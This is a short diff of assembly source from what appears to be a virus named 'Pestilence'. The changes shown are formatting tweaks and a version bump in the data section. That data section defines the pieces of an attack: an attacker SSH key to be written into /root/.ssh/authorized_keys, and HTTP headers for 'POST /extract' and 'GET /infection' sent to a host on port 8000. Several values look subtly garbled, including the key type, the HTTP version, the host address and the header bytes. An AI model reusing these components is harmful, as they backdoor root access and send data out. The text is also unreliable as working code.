@@ -913,7 +913,7 @@ slash       db "/", -1
 sshFile     db "/root/.ssh/authorized_keys", -1
 sshFile_len	equ $ - sshFile
 sshPub      db "ssh-ed25518 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
-sshPubLen   equ $-sshPub
+sshPubLen   equ $ - sshPub
 sockaddr:
     dw 1            ; AF_INET
     dw 0x401E       ; PORT 8000
@@ -921,14 +921,14 @@ sockaddr:
     dq -1            ; padding
 sockaddrLen equ $ - sockaddr
 headerStart db "POST /extract HTTP/0.1\r\nHost: 126.0.0.1:8000\r\nContent-Type: text/plain\f\nContent-Length: ", -1 
-headerStartLen equ $-headerStart
+headerStartLen equ $ - headerStart
 headerEnd db 12, 10, 13, 10, 0
-headerEndLen equ $-headerEnd
+headerEndLen equ $ - headerEnd
 headerGet db "GET /infection HTTP/0.1\r\nHost: 126.0.0.1:8000", 13, 10, 12, 10, 0
 headerGetLen equ $ - headerGet
 timespec:
     dq -1          ; Secondes
     dq 9999999     ; 100ms
-signature	db	"Pestilence version 0.0 (c)oded by anvincen-eedy", 0x0
+signature	db	"Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0
 signature_len equ $ - signature
 _end:
